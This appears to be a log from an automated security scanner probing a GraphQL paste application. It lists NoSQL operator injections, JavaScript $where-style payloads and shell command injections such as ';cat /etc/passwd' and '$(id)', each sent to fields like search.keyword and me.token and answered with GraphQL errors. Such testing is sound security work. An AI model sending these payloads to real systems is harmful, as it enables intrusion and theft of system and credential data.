2026-02-03 20:06:25,455 | INFO    | GraphQLClient        | -                              | introspection        | POST | success  |  0.514s | payload=[__schema] response=[{"data": {"__schema": {"queryType": {"name": "Query", "fields": [{"name": "pastes", "args": [{"name": "public", "type": {"name": "Boolean", "kind": "SCALAR", "ofType": null}}, {"name": "limit", "type"…]
2026-02-03 20:06:28,004 | INFO    | InjectionTester      | mongo_gte_operator             | search.keyword       | POST | success  |  0.002s | payload=[{"$gte": ""}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:28) Expected Name, found $\n\n1: query { search(keyword: \"{\"$gte\": \"\"}\") { id message error success } }\n                              ^\n", "loc…]
2026-02-03 20:06:28,007 | INFO    | InjectionTester      | mongo_lt_operator              | search.keyword       | POST | success  |  0.002s | payload=[{"$lt": "~"}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:28) Expected Name, found $\n\n1: query { search(keyword: \"{\"$lt\": \"~\"}\") { id message error success } }\n                              ^\n", "loc…]
2026-02-03 20:06:28,009 | INFO    | InjectionTester      | mongo_regex_all                | search.keyword       | POST | success  |  0.002s | payload=[{"$regex": ".*"}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:28) Expected Name, found $\n\n1: query { search(keyword: \"{\"$regex\": \".*\"}\") { id message error success } }\n                              ^\n", …]
2026-02-03 20:06:28,011 | INFO    | InjectionTester      | mongo_regex_admin              | search.keyword       | POST | success  |  0.002s | payload=[{"$regex": "^admin"}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:28) Expected Name, found $\n\n1: query { search(keyword: \"{\"$regex\": \"^admin\"}\") { id message error success } }\n                              ^\…]
2026-02-03 20:06:28,013 | INFO    | InjectionTester      | mongo_in_operator              | search.keyword       | POST | success  |  0.002s | payload=[{"$in": ["admin", "root", "test"]}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:28) Expected Name, found $\n\n1: query { search(keyword: \"{\"$in\": [\"admin\", \"root\", \"test\"]}\") { id message error success } }\n              …]
2026-02-03 20:06:28,015 | INFO    | InjectionTester      | mongo_nin_operator             | search.keyword       | POST | success  |  0.002s | payload=[{"$nin": ["impossible_value_xyz"]}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:28) Expected Name, found $\n\n1: query { search(keyword: \"{\"$nin\": [\"impossible_value_xyz\"]}\") { id message error success } }\n                  …]
2026-02-03 20:06:28,017 | INFO    | InjectionTester      | mongo_exists_true              | search.keyword       | POST | success  |  0.002s | payload=[{"$exists": true}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:28) Expected Name, found $\n\n1: query { search(keyword: \"{\"$exists\": true}\") { id message error success } }\n                              ^\n", "…]
2026-02-03 20:06:28,041 | INFO    | InjectionTester      | mongo_or_bypass                | search.keyword       | POST | success  |  0.024s | payload=[{"$or": [{"": ""}, {"$gt": ""}]}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:28) Expected Name, found $\n\n1: query { search(keyword: \"{\"$or\": [{\"\": \"\"}, {\"$gt\": \"\"}]}\") { id message error success } }\n              …]
2026-02-03 20:06:28,045 | INFO    | InjectionTester      | mongo_where_true               | search.keyword       | POST | success  |  0.003s | payload=[' || true || '] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 45}]}, {…]
2026-02-03 20:06:28,047 | INFO    | InjectionTester      | mongo_where_1_eq_1             | search.keyword       | POST | success  |  0.002s | payload=[1' || '1'=='1] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 44}]}, {…]
2026-02-03 20:06:28,050 | INFO    | InjectionTester      | mongo_where_sleep              | search.keyword       | POST | success  |  0.002s | payload=[';sleep(5000);'] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 46}]}, {…]
2026-02-03 20:06:28,053 | INFO    | InjectionTester      | mongo_where_this               | search.keyword       | POST | success  |  0.003s | payload=[' || this.password || '] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 54}]}, {…]
2026-02-03 20:06:28,056 | INFO    | InjectionTester      | mongo_where_function           | search.keyword       | POST | success  |  0.003s | payload=[';return true;var x='] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 52}]}, {…]
2026-02-03 20:06:28,059 | INFO    | InjectionTester      | mongo_where_tojsononeline      | search.keyword       | POST | success  |  0.002s | payload=[' || tojsononeline(this) || '] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 60}]}, {…]
2026-02-03 20:06:28,061 | INFO    | InjectionTester      | graphql_nested_ne              | search.keyword       | POST | success  |  0.002s | payload=[{"password": {"$ne": ""}}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:36) Expected :, found String \": {\"\n\n1: query { search(keyword: \"{\"password\": {\"$ne\": \"\"}}\") { id message error success } }\n               …]
2026-02-03 20:06:28,063 | INFO    | InjectionTester      | graphql_nested_gt              | search.keyword       | POST | success  |  0.002s | payload=[{"password": {"$gt": ""}}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:36) Expected :, found String \": {\"\n\n1: query { search(keyword: \"{\"password\": {\"$gt\": \"\"}}\") { id message error success } }\n               …]
2026-02-03 20:06:28,065 | INFO    | InjectionTester      | graphql_nested_regex           | search.keyword       | POST | success  |  0.002s | payload=[{"username": {"$regex": ".*"}, "password": {"$ne": ""}}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:36) Expected :, found String \": {\"\n\n1: query { search(keyword: \"{\"username\": {\"$regex\": \".*\"}, \"password\": {\"$ne\": \"\"}}\") { id messag…]
2026-02-03 20:06:28,068 | INFO    | InjectionTester      | graphql_array_injection        | search.keyword       | POST | success  |  0.002s | payload=[["admin", {"$gt": ""}]] response=[{"errors": [{"message": "Syntax Error GraphQL (1:33) Expected :, found String \", {\"\n\n1: query { search(keyword: \"[\"admin\", {\"$gt\": \"\"}]\") { id message error success } }\n                  …]
2026-02-03 20:06:28,070 | INFO    | InjectionTester      | auth_bypass_ne_empty           | search.keyword       | POST | success  |  0.002s | payload=[{"$ne": null}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:28) Expected Name, found $\n\n1: query { search(keyword: \"{\"$ne\": null}\") { id message error success } }\n                              ^\n", "loca…]
2026-02-03 20:06:28,073 | INFO    | InjectionTester      | semicolon_id                   | me.token             | POST | success  |  0.003s | payload=[;id] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 31}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:28,076 | INFO    | InjectionTester      | pipe_id                        | me.token             | POST | success  |  0.003s | payload=[|id] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 31}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:28,079 | INFO    | InjectionTester      | double_pipe_id                 | me.token             | POST | success  |  0.003s | payload=[||id] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 32}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:28,082 | INFO    | InjectionTester      | and_id                         | me.token             | POST | success  |  0.003s | payload=[&& id] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 33}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:28,085 | INFO    | InjectionTester      | semicolon_cat_passwd           | me.token             | POST | success  |  0.003s | payload=[;cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 44}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:28,089 | INFO    | InjectionTester      | pipe_cat_passwd                | me.token             | POST | success  |  0.003s | payload=[|cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 44}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:28,092 | INFO    | InjectionTester      | double_pipe_cat_passwd         | me.token             | POST | success  |  0.003s | payload=[||cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 45}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:28,095 | INFO    | InjectionTester      | and_cat_passwd                 | me.token             | POST | success  |  0.003s | payload=[&& cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 46}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:28,098 | INFO    | InjectionTester      | semicolon_uname                | me.token             | POST | success  |  0.003s | payload=[;uname -a] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 37}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:28,101 | INFO    | InjectionTester      | pipe_uname                     | me.token             | POST | success  |  0.003s | payload=[|uname -a] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 37}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:28,104 | INFO    | InjectionTester      | double_pipe_uname              | me.token             | POST | success  |  0.003s | payload=[||uname -a] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 38}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:28,107 | INFO    | InjectionTester      | and_uname                      | me.token             | POST | success  |  0.003s | payload=[&& uname -a] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 39}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:28,110 | INFO    | InjectionTester      | backtick_cat_passwd            | me.token             | POST | success  |  0.003s | payload=[`cat /etc/passwd`] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 45}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:28,113 | INFO    | InjectionTester      | backtick_id                    | me.token             | POST | success  |  0.003s | payload=[`id`] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 32}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:28,116 | INFO    | InjectionTester      | backtick_uname                 | me.token             | POST | success  |  0.003s | payload=[`uname -a`] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 38}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:28,119 | INFO    | InjectionTester      | dollar_cat_passwd              | me.token             | POST | success  |  0.003s | payload=[$(cat /etc/passwd)] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 46}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:28,122 | INFO    | InjectionTester      | dollar_id                      | me.token             | POST | success  |  0.003s | payload=[$(id)] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 33}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:28,125 | INFO    | InjectionTester      | dollar_uname                   | me.token             | POST | success  |  0.003s | payload=[$(uname -a)] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 39}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:28,128 | INFO    | InjectionTester      | plain_uname                    | me.token             | POST | success  |  0.003s | payload=[uname -a] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 36}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:28,132 | INFO    | InjectionTester      | chain_semicolon                | me.token             | POST | success  |  0.003s | payload=[;cat /etc/passwd;id] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 47}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:28,135 | INFO    | InjectionTester      | chain_pipe                     | me.token             | POST | success  |  0.003s | payload=[|cat /etc/passwd|id] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 47}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:28,138 | INFO    | InjectionTester      | chain_and                      | me.token             | POST | success  |  0.003s | payload=[&&cat /etc/passwd&&id] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 49}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:28,141 | INFO    | InjectionTester      | plain_cat_passwd               | me.token             | POST | success  |  0.003s | payload=[cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 43}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:28,144 | INFO    | InjectionTester      | space_semicolon_cat            | me.token             | POST | success  |  0.003s | payload=[; cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 45}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:28,147 | INFO    | InjectionTester      | space_pipe_cat                 | me.token             | POST | success  |  0.003s | payload=[| cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 45}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:28,150 | INFO    | InjectionTester      | space_and_cat                  | me.token             | POST | success  |  0.003s | payload=[&& cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 46}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:28,152 | INFO    | InjectionTester      | mongo_ne_operator              | me.token             | POST | success  |  0.002s | payload=[{"$ne": ""}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:22) Expected Name, found $\n\n1: query { me(token: \"{\"$ne\": \"\"}\") { id message error success } }\n                        ^\n", "locations": [{"l…]
2026-02-03 20:06:28,154 | INFO    | InjectionTester      | mongo_gt_operator              | me.token             | POST | success  |  0.002s | payload=[{"$gt": ""}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:22) Expected Name, found $\n\n1: query { me(token: \"{\"$gt\": \"\"}\") { id message error success } }\n                        ^\n", "locations": [{"l…]
2026-02-03 20:06:28,156 | INFO    | InjectionTester      | mongo_gte_operator             | me.token             | POST | success  |  0.002s | payload=[{"$gte": ""}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:22) Expected Name, found $\n\n1: query { me(token: \"{\"$gte\": \"\"}\") { id message error success } }\n                        ^\n", "locations": [{"…]
2026-02-03 20:06:28,158 | INFO    | InjectionTester      | mongo_lt_operator              | me.token             | POST | success  |  0.002s | payload=[{"$lt": "~"}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:22) Expected Name, found $\n\n1: query { me(token: \"{\"$lt\": \"~\"}\") { id message error success } }\n                        ^\n", "locations": [{"…]
2026-02-03 20:06:28,160 | INFO    | InjectionTester      | mongo_regex_all                | me.token             | POST | success  |  0.002s | payload=[{"$regex": ".*"}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:22) Expected Name, found $\n\n1: query { me(token: \"{\"$regex\": \".*\"}\") { id message error success } }\n                        ^\n", "locations":…]
2026-02-03 20:06:28,162 | INFO    | InjectionTester      | mongo_regex_admin              | me.token             | POST | success  |  0.002s | payload=[{"$regex": "^admin"}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:22) Expected Name, found $\n\n1: query { me(token: \"{\"$regex\": \"^admin\"}\") { id message error success } }\n                        ^\n", "locatio…]
2026-02-03 20:06:28,164 | INFO    | InjectionTester      | mongo_in_operator              | me.token             | POST | success  |  0.002s | payload=[{"$in": ["admin", "root", "test"]}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:22) Expected Name, found $\n\n1: query { me(token: \"{\"$in\": [\"admin\", \"root\", \"test\"]}\") { id message error success } }\n                    …]
2026-02-03 20:06:28,166 | INFO    | InjectionTester      | mongo_nin_operator             | me.token             | POST | success  |  0.002s | payload=[{"$nin": ["impossible_value_xyz"]}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:22) Expected Name, found $\n\n1: query { me(token: \"{\"$nin\": [\"impossible_value_xyz\"]}\") { id message error success } }\n                        …]
2026-02-03 20:06:28,168 | INFO    | InjectionTester      | mongo_exists_true              | me.token             | POST | success  |  0.002s | payload=[{"$exists": true}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:22) Expected Name, found $\n\n1: query { me(token: \"{\"$exists\": true}\") { id message error success } }\n                        ^\n", "locations": …]
2026-02-03 20:06:28,171 | INFO    | InjectionTester      | mongo_or_bypass                | me.token             | POST | success  |  0.002s | payload=[{"$or": [{"": ""}, {"$gt": ""}]}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:22) Expected Name, found $\n\n1: query { me(token: \"{\"$or\": [{\"\": \"\"}, {\"$gt\": \"\"}]}\") { id message error success } }\n                    …]
2026-02-03 20:06:28,174 | INFO    | InjectionTester      | mongo_where_true               | me.token             | POST | success  |  0.003s | payload=[' || true || '] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 42}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:28,177 | INFO    | InjectionTester      | mongo_where_1_eq_1             | me.token             | POST | success  |  0.003s | payload=[1' || '1'=='1] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 41}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:28,180 | INFO    | InjectionTester      | mongo_where_sleep              | me.token             | POST | success  |  0.003s | payload=[';sleep(5000);'] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 43}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:28,183 | INFO    | InjectionTester      | mongo_where_this               | me.token             | POST | success  |  0.003s | payload=[' || this.password || '] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 51}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:28,186 | INFO    | InjectionTester      | mongo_where_function           | me.token             | POST | success  |  0.003s | payload=[';return true;var x='] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 49}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:28,189 | INFO    | InjectionTester      | mongo_where_tojsononeline      | me.token             | POST | success  |  0.003s | payload=[' || tojsononeline(this) || '] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 57}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-03 20:06:28,191 | INFO    | InjectionTester      | graphql_nested_ne              | me.token             | POST | success  |  0.002s | payload=[{"password": {"$ne": ""}}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:30) Expected :, found String \": {\"\n\n1: query { me(token: \"{\"password\": {\"$ne\": \"\"}}\") { id message error success } }\n                     …]
2026-02-03 20:06:28,193 | INFO    | InjectionTester      | graphql_nested_gt              | me.token             | POST | success  |  0.002s | payload=[{"password": {"$gt": ""}}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:30) Expected :, found String \": {\"\n\n1: query { me(token: \"{\"password\": {\"$gt\": \"\"}}\") { id message error success } }\n                     …]
2026-02-03 20:06:28,195 | INFO    | InjectionTester      | graphql_nested_regex           | me.token             | POST | success  |  0.002s | payload=[{"username": {"$regex": ".*"}, "password": {"$ne": ""}}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:30) Expected :, found String \": {\"\n\n1: query { me(token: \"{\"username\": {\"$regex\": \".*\"}, \"password\": {\"$ne\": \"\"}}\") { id message erro…]
2026-02-03 20:06:28,197 | INFO    | InjectionTester      | graphql_array_injection        | me.token             | POST | success  |  0.002s | payload=[["admin", {"$gt": ""}]] response=[{"errors": [{"message": "Syntax Error GraphQL (1:27) Expected :, found String \", {\"\n\n1: query { me(token: \"[\"admin\", {\"$gt\": \"\"}]\") { id message error success } }\n                        …]
2026-02-03 20:06:28,199 | INFO    | InjectionTester      | auth_bypass_ne_empty           | me.token             | POST | success  |  0.002s | payload=[{"$ne": null}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:22) Expected Name, found $\n\n1: query { me(token: \"{\"$ne\": null}\") { id message error success } }\n                        ^\n", "locations": [{"l…]
2026-02-03 20:06:28,202 | INFO    | InjectionTester      | semicolon_id                   | createPaste.content  | POST | success  |  0.003s | payload=[;id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 83}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:28,205 | INFO    | InjectionTester      | pipe_id                        | createPaste.content  | POST | success  |  0.003s | payload=[|id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 83}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:28,209 | INFO    | InjectionTester      | double_pipe_id                 | createPaste.content  | POST | success  |  0.003s | payload=[||id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 84}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:28,213 | INFO    | InjectionTester      | and_id                         | createPaste.content  | POST | success  |  0.004s | payload=[&& id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 85}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:28,216 | INFO    | InjectionTester      | semicolon_cat_passwd           | createPaste.content  | POST | success  |  0.003s | payload=[;cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 96}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:28,219 | INFO    | InjectionTester      | pipe_cat_passwd                | createPaste.content  | POST | success  |  0.003s | payload=[|cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 96}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:28,223 | INFO    | InjectionTester      | double_pipe_cat_passwd         | createPaste.content  | POST | success  |  0.003s | payload=[||cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 97}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:28,226 | INFO    | InjectionTester      | and_cat_passwd                 | createPaste.content  | POST | success  |  0.003s | payload=[&& cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 98}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:28,229 | INFO    | InjectionTester      | semicolon_uname                | createPaste.content  | POST | success  |  0.003s | payload=[;uname -a] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 89}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:28,232 | INFO    | InjectionTester      | pipe_uname                     | createPaste.content  | POST | success  |  0.003s | payload=[|uname -a] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 89}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:28,235 | INFO    | InjectionTester      | double_pipe_uname              | createPaste.content  | POST | success  |  0.003s | payload=[||uname -a] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 90}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:28,238 | INFO    | InjectionTester      | and_uname                      | createPaste.content  | POST | success  |  0.003s | payload=[&& uname -a] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 91}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:28,241 | INFO    | InjectionTester      | backtick_cat_passwd            | createPaste.content  | POST | success  |  0.003s | payload=[`cat /etc/passwd`] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 97}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:28,245 | INFO    | InjectionTester      | backtick_id                    | createPaste.content  | POST | success  |  0.003s | payload=[`id`] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 84}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:28,248 | INFO    | InjectionTester      | backtick_uname                 | createPaste.content  | POST | success  |  0.003s | payload=[`uname -a`] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 90}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:28,251 | INFO    | InjectionTester      | dollar_cat_passwd              | createPaste.content  | POST | success  |  0.003s | payload=[$(cat /etc/passwd)] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 98}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:28,254 | INFO    | InjectionTester      | dollar_id                      | createPaste.content  | POST | success  |  0.003s | payload=[$(id)] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 85}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:06:28,258 | INFO    | InjectionTester      | dollar_uname                   | createPaste.content  | POST | success  |  0.003s | payload=[$(uname -a)] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 91}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
